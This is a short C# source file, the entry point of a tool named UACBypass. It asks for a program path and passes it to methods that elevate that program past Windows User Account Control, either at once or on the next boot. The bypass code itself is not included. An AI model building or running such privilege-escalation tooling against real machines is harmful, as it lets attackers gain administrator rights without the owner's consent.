using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using UACBypass;
namespace UACBypass
{
    class Program
    {
        static void Main(string[] args)
        {
            bool oldMethod = true;
            Console.Write("Path To Elevate : ");
            string path_to_elevate = Console.ReadLine();

            if(oldMethod)
            {
                //path_to_elevate immediately process
                BypassUAC.AttempOldMethod(path_to_elevate);
            }else
            {
                //Next boot-up will elevate process
                BypassUAC.AttemptNewMethod(path_to_elevate);
            }
        }
    }
}
